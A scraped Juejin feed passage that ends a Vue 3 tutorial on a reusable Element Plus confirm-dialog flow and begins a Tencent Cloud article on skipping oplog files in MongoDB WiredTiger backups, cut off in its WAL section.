<span class="hljs-keyword">import</span> type { <span class="hljs-title class_">Action</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"./customConfirmDialog"</span>;

<span class="hljs-keyword">const</span> props = defineProps&lt;{
  title?: string;
  message?: string;
  confirmText?: string;
  beforeClose?: <span class="hljs-title class_">Function</span>;
}&gt;();

<span class="hljs-keyword">const</span> emit = defineEmits&lt;{
  (<span class="hljs-attr">e</span>: <span class="hljs-string">"action"</span>, <span class="hljs-attr">action</span>: <span class="hljs-title class_">Action</span>): <span class="hljs-keyword">void</span>;
}&gt;();

<span class="hljs-keyword">const</span> root = <span class="hljs-title function_">getCurrentInstance</span>();

<span class="hljs-keyword">const</span> visible = <span class="hljs-title function_">defineModel</span>({ <span class="hljs-attr">default</span>: <span class="hljs-literal">false</span> });
<span class="hljs-keyword">const</span> loading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>);

<span class="hljs-keyword">const</span> <span class="hljs-title function_">confirm</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> props.<span class="hljs-property">beforeClose</span>?.(<span class="hljs-string">"confirm"</span>, root?.<span class="hljs-property">exposed</span> || {}, <span class="hljs-function">() =&gt;</span> {
    visible.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
  });
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">"action"</span>, <span class="hljs-string">"confirm"</span>);
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">cancel</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> props.<span class="hljs-property">beforeClose</span>?.(<span class="hljs-string">"cancel"</span>, root?.<span class="hljs-property">exposed</span> || {}, <span class="hljs-function">() =&gt;</span> {
    visible.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
  });
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">"action"</span>, <span class="hljs-string">"cancel"</span>);
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">open</span> = (<span class="hljs-params"/>) =&gt; {
  visible.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">close</span> = (<span class="hljs-params"/>) =&gt; {
  visible.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
};

<span class="hljs-title function_">defineExpose</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(
    {
      open,
      close,
      <span class="hljs-attr">confirmButtonLoading</span>: loading.<span class="hljs-property">value</span>,
    },
    {
      <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">target, key, receiver</span>) =&gt;</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver);
      },
      <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">target, key, value, receiver</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value, receiver);
        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">"confirmButtonLoading"</span>) {
          loading.<span class="hljs-property">value</span> = value;
        }

        <span class="hljs-keyword">return</span> result;
      },
    }
  )
);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>

</code></pre>
<ol start="2">
<li>添加一个 <strong>customConfirmDialog.ts</strong> 将弹窗组件按命令式弹窗的方式使用 <strong>confirm</strong> 来创建。</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">CustomConfirmDialogConstructor</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./CustomConfirmDialog.vue"</span>;

<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">ConfirmFlowOptions</span>, <span class="hljs-title class_">CustomConfirmMessage</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/utils"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">ElMessageBoxOptions</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"element-plus"</span>;
<span class="hljs-keyword">import</span> {
  createVNode,
  render,
  <span class="hljs-keyword">type</span> <span class="hljs-title class_">AppContext</span>,
  <span class="hljs-keyword">type</span> <span class="hljs-title class_">ComponentInternalInstance</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">Action</span> = <span class="hljs-string">"confirm"</span> | <span class="hljs-string">"cancel"</span>;

<span class="hljs-keyword">const</span> instanceMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;
  <span class="hljs-title class_">ComponentInternalInstance</span>,
  {
    <span class="hljs-attr">options</span>: <span class="hljs-built_in">any</span>;
    <span class="hljs-attr">resolve</span>: <span class="hljs-function">(<span class="hljs-params">res: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;
    <span class="hljs-attr">reject</span>: <span class="hljs-function">(<span class="hljs-params">reason?: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;
  }
&gt;();

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomConfirmDialog</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CustomConfirmMessage</span> {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">confirm</span>(<span class="hljs-params">
    message: ElMessageBoxOptions[<span class="hljs-string">"message"</span>],
    options?: ConfirmFlowOptions,
    appContext?: AppContext
  </span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> instance = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createInstance</span>({ message, ...options }, appContext);

      instanceMap.<span class="hljs-title function_">set</span>(instance, { options, resolve, reject });
    });
  }

  <span class="hljs-title function_">createInstance</span>(<span class="hljs-params">options: ConfirmFlowOptions, appContext?: AppContext</span>) {
    <span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"div"</span>);

    <span class="hljs-keyword">const</span> instance = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initInstance</span>(options, container, appContext)!;
    instance.<span class="hljs-property">exposed</span>?.<span class="hljs-title function_">open</span>();

    <span class="hljs-keyword">return</span> instance;
  }

  <span class="hljs-title function_">initInstance</span>(<span class="hljs-params">
    props: <span class="hljs-built_in">any</span>,
    container: HTMLElement,
    appContext: AppContext | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>
  </span>) {
    <span class="hljs-keyword">const</span> vnode = <span class="hljs-title function_">createVNode</span>(<span class="hljs-title class_">CustomConfirmDialogConstructor</span>, props);

    vnode.<span class="hljs-property">appContext</span> = appContext;

    <span class="hljs-title function_">render</span>(vnode, container);

    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(container.<span class="hljs-property">firstElementChild</span>!);

    <span class="hljs-keyword">return</span> vnode.<span class="hljs-property">component</span>;
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomConfirmDialog</span>();

</code></pre>
<ol start="3">
<li>页面使用验证功能是否正常</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">CustomConfirmDialog</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"./CustomConfirmDialog"</span>;
<span class="hljs-keyword">import</span> { createConfirmFlow } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/utils/business"</span>;

<span class="hljs-comment">// 自定义确认组件</span>
<span class="hljs-keyword">const</span> handleSensitiveOp = <span class="hljs-title function_">createConfirmFlow</span>(
  <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">api</span>();
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"操作成功"</span>);
  },
  {
    <span class="hljs-title class_">CustomComponent</span>: <span class="hljs-title class_">CustomConfirmDialog</span>,
    <span class="hljs-attr">message</span>: <span class="hljs-string">"此操作包含敏感数据修改，是否继续？"</span>,
    <span class="hljs-attr">title</span>: <span class="hljs-string">"敏感操作确认"</span>,
    <span class="hljs-attr">beforeClose</span>: <span class="hljs-keyword">async</span> (action, instance, done) =&gt; {
      <span class="hljs-keyword">if</span> (action === <span class="hljs-string">"confirm"</span>) {
        instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">2000</span>); <span class="hljs-comment">// 模拟异步操作</span>
        instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">false</span>;
      }
      <span class="hljs-title function_">done</span>();
    },
  }
);

</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13a534c3c04648bf94abc72a955125f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW5DQmxl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764518510&amp;x-signature=s8uBCXSHnR6%2FJoXt0O9J%2B5R6R5A%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>完全没有问题。至此也就完成了这样一个流程复用的工具函数。</p>
</blockquote>
<h2 data-id="heading-10">confirmFlow 函数完整代码</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ElMessageBox</span>, <span class="hljs-keyword">type</span> <span class="hljs-title class_">ElMessageBoxOptions</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"element-plus"</span>;
<span class="hljs-keyword">import</span> { isFunction, isNull, isObject } <span class="hljs-keyword">from</span> <span class="hljs-string">"lodash-es"</span>;

<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">VNode</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">Message</span> = <span class="hljs-built_in">string</span> | <span class="hljs-title class_">VNode</span> | (<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">VNode</span>);
<span class="hljs-keyword">type</span> <span class="hljs-title class_">CallBack</span> = <span class="hljs-function">(<span class="hljs-params">...args: <span class="hljs-built_in">any</span>[]</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; | <span class="hljs-built_in">void</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ConfirmFlowOptions</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ElMessageBoxOptions</span> {
  message?: <span class="hljs-title class_">Message</span>;
  title?: <span class="hljs-built_in">string</span>;
  <span class="hljs-title class_">CustomComponent</span>?: <span class="hljs-title class_">CustomConfirmMessage</span> | <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;;
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">CustomConfirmMessage</span> {
  <span class="hljs-attr">confirm</span>: <span class="hljs-function">(<span class="hljs-params">
    message: ElMessageBoxOptions[<span class="hljs-string">"message"</span>],
    options?: ConfirmFlowOptions
  </span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt;;
}

<span class="hljs-keyword">const</span> isConfirmMessage = (<span class="hljs-attr">obj</span>: <span class="hljs-built_in">unknown</span>): obj is <span class="hljs-title class_">CustomConfirmMessage</span> =&gt;
  <span class="hljs-title function_">isObject</span>(obj) &amp;&amp; !<span class="hljs-title function_">isNull</span>(obj) &amp;&amp; <span class="hljs-string">"confirm"</span> <span class="hljs-keyword">in</span> obj &amp;&amp; <span class="hljs-title function_">isFunction</span>(obj.<span class="hljs-property">confirm</span>);

<span class="hljs-keyword">const</span> <span class="hljs-title function_">getMessageConstructor</span> = (<span class="hljs-params">options: ConfirmFlowOptions = {}</span>) =&gt; {
  <span class="hljs-keyword">const</span> { <span class="hljs-title class_">CustomComponent</span> } = options;

  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isConfirmMessage</span>(<span class="hljs-title class_">CustomComponent</span>)) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">CustomComponent</span>;
  }

  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ElMessageBox</span>;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">createConfirmFlow</span> = (<span class="hljs-params">
  callback: CallBack,
  options?: ConfirmFlowOptions
</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">async</span> (...<span class="hljs-attr">args</span>: <span class="hljs-title class_">Parameters</span>&lt;<span class="hljs-title class_">CallBack</span>&gt;) =&gt; {
    <span class="hljs-keyword">const</span> <span class="hljs-title class_">ConfirmMessage</span> = <span class="hljs-title function_">getMessageConstructor</span>(options);

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title class_">ConfirmMessage</span>.<span class="hljs-title function_">confirm</span>(options?.<span class="hljs-property">message</span>, options);
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">callback</span>(...args);
      <span class="hljs-comment">// 修改状态...</span>
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);
    }
  };
};

</code></pre>
<h2 data-id="heading-11">总结 &amp; 问题</h2>
<ol>
<li>示例中的自定义命令式弹窗组件有一个问题，就是没有卸载组件，每次调用 <strong>confirm</strong> 时都会创建一个新的 <strong>dialog</strong> 而旧的未销毁，大家也可以分享一下该如何处理，或指正一下我是否写的有问题。我用 <strong>render(null,container)</strong> 跟 <strong>container.remove()</strong> 也无法销毁。</li>
<li>大家会发现实际上封装一个这样的流程处理函数并不是难事，难的是我们在开发的过程中是否能够想到这些代码优化的方式。我也是看到了其他大佬的分享才学到了这些知识并应用在了实际工作中。如有问题大家一起讨论学习。后续我还会出一个通用的错误流程处理函数跟这个是类似的。</li>
<li>大家如果有一些工作中比较实用的一些编码思维等等，也可以一起分享出来学习学习。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[「腾讯云NoSQL」技术之 MongoDB 篇:MongoDB 存储引擎备份性能70%提升内幕揭秘]]></title>    <link>https://juejin.cn/post/7575751471841869860</link>    <guid>https://juejin.cn/post/7575751471841869860</guid>    <pubDate>2025-11-24T03:06:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471841869860" data-draft-id="7575937594350026795" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="「腾讯云NoSQL」技术之 MongoDB 篇:MongoDB 存储引擎备份性能70%提升内幕揭秘"/> <meta itemprop="keywords" content="数据库,NoSQL"/> <meta itemprop="datePublished" content="2025-11-24T03:06:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="腾讯云数据库"/> <meta itemprop="url" content="https://juejin.cn/user/3227821871466094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            「腾讯云NoSQL」技术之 MongoDB 篇:MongoDB 存储引擎备份性能70%提升内幕揭秘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821871466094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    腾讯云数据库
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:06:15.000Z" title="Mon Nov 24 2025 03:06:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0cd903f8a5347a798f6b608a180da52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=W9YE8r%2BcI9PAYKrbmVSEEOigFzk%3D" alt="图片" loading="lazy"/></p>
<blockquote>
<p>在非结构化数据爆炸式增长的今天，MongoDB 凭借其灵活的文档模型与分布式集群架构成为游戏行业高并发场景的首选数据库。然而，在大文档场景，oplog 的备份和回档长期存在效率瓶颈——传统备份方式需全量拷贝数据目录，导致资源浪费。基于以上业务痛点，腾讯云 NoSQL 与内核团队深入解析 WiredTiger 存储引擎原理，新增 exclude_target 功能，通过智能识别并跳过冗余的无用 oplog.wt 文件，实现备份耗时、存储成本及网络带宽的70%缩减，为游戏、电商等高并发场景提供更高效的运维支持。</p>
<p>作者：腾讯云NoSQL团队-杨亚洲、尹超</p>
</blockquote>
<p>线上有部分 MongoDB 业务，因其业务独特性产生了海量的非结构化数据（如游戏日志、用户行为记录等），常面临文档大、更新写入频繁的挑战。为了存储足够的oplog ，运维人员往往需要将 oplog size 设置得比较大，甚至远远超过了业务数据本身的大小。MongoDB 物理备份基于 wiredTiger 存储 backup 功能实现，该功能主要拷贝数据目录中的所有 wt 文件，包括用户数据文件、oplog 、系统 wt 文件等。</p>
<p>数据目录中所有 wt 文件越大，客户的物理备份及回档时间也就越长，下面以某核心游戏业务为例进行说明，该业务对应实例不同 wt 文件数据量总结如下：</p>
<p><strong><strong>●</strong> 真实业务数据大小：230G</strong></p>
<p><strong><strong>●</strong> Admin 、config 等系统数据大小：&lt; 1G</strong></p>
<p><strong><strong>●</strong> Oplog 大小(oplog.rs 表)： 515G</strong></p>
<p>从上面的统计可以看出，oplog 数据大小占比约70%。由于社区 MongoDB 存储引擎的 backup 物理备份功能必须对数据目录所有文件做备份，回档才会成功，这意味着每次备份都有大量资源浪费在重复备份 oplog 上，导致备份和回档时间过长，存储成本和网络带宽消耗巨大。</p>
<p>基于以上的业务痛点，腾讯云对 MongoDB 存储引擎的 backup 做了一次深入分析及优化，基于 wiredTiger 存储引擎 backup 新增 exclude_target 功能，该功能可以忽略备份指定 wt 文件，同时可以做到只基于用户数据文件正常启动 mongoDB ，从而确保回档成功。</p>
<p><strong>腾讯云 MongoDB 优化后的物理备份回档直接带来了显著的性能提升:</strong></p>
<p><strong><strong>●</strong>  备份耗时：减少70%</strong></p>
<p><strong><strong>●</strong>  回档耗时：减少70%</strong></p>
<p><strong><strong>●</strong>  存储成本：节省70%</strong></p>
<p><strong><strong>●</strong> 网络带宽占用：减少70%</strong></p>
<h2 data-id="heading-0"><strong>1 腾讯云物理备份回档原理</strong></h2>
<p>腾讯云 MongoDB 物理备份基于 wiredTiger 存储引擎的 hotbackup 功能实现，该功能底层以 checkpoint 检测点实现节点的完整数据快照。物理备份期间，会通过物理拷贝的方式拷贝整个数据目录中的所有文件存入腾讯云 cos 对象存储，数据文件越大，整个全量备份耗时就会越长。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3527b2bbb51d4da6bc3f70ea6dc14215~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=SZtEtnm0B7x8BL97xjI4TXHAjP0%3D" alt="image.png" loading="lazy"/></p>
<p>同理，当对整个实例进行整实例回档的时候，我们需要从 cos 下载前面备份的所有 wt 数据文件，总文件越大，下载也会越耗时。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b623ce96972449ecb75ad94ac4698c6e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=rWSEDkgCwdxHQzcqsL%2FKqhQ6qlA%3D" alt="image.png" loading="lazy"/></p>
<p>从上面的备份和回档流程可以看出，全量物理备份的时候我们需要拷贝 oplog.wt 到 cos , 下载的时候也需要从 cos 下载这个 oplog.wt 文件。</p>
<p>Oplog.wt 物理文件中存储的是历史增量数据，主要用于主从数据同步和增量逻辑备份。回档从 cos 下载完全量物理备份数据到3个节点，然后通过这3个节点构建副本集一致状态，这些用户数据表 .wt+ 其他内部表 .wt 可以决定这个全量一致状态，因此 oplog.wt 对构建副本集是无用数据。</p>
<p>此外腾讯云 MongoDB 团队也会逻辑实时备份 oplog.rs 表中的增量数据到 cos 对象存储，通过上面实例构建完的一致状态 +oplog.rs 增量数据的逻辑回放可以保证快速恢复数据到任意时间点。通过 oplog.rs 表实时逻辑备份的数据实际上和物理 oplog.wt 文件中的内容是重复的，oplog.rs 逻辑备份的数据包含了 oplog.wt 中的数据，因此再一次证明 oplog.wt 是重复的无用wt文件。</p>
<p>说明：为了便于理解，这里直接用表名 .wt 来表示该表对应磁盘上的 wt 文件，实际上表对应的 wt 文件名在 mongo server 层做了一次转换。实际对应关系可以通过 db. 表名 .stats().wi redTiger.uri 获取，以 oplog.wt 为例，它对应磁盘的文件路径如下:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c46aacaa43af466aa210325ab73e8e51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=OVUXdVcuxVZEm328YfLklyN5uQA%3D" alt="image.png" loading="lazy"/>
本文基于以上背景，通过 MongoDB 内核支持忽略 oplog.wt 的备份和回档，从而让该游戏核心客户的全量备份回档时间提速70%。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9535960692cc4b8aabe1cf7def550446~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=uhhGSV5C9JtAiD1f6iTZYqroc7A%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">2 wiredTiger 存储引擎数据持久化及恢复原理</h2>
<p>wiredTiger 存储引擎的 hotbackup 功能以 wt 的 checkpoint 检测点为基础。单节点故障恢复除了依赖 checkpoint ，同时也依赖 WAL 。</p>
<h3 data-id="heading-2">2.1 WAL</h3>
<p>先简单了解下 WAL 的一些理论说明， WAL（预写日志系统，（ Write-ahead logging ，缩写 WAL ））是数据库管理系统**实现事务持久性与故障恢复的核心机制，通过“先记录日志后修改数据”的原则确保事务原子性和数据一致性。</p>
<h4 data-id="heading-3">2.1.1 为什么需要 WAL</h4>
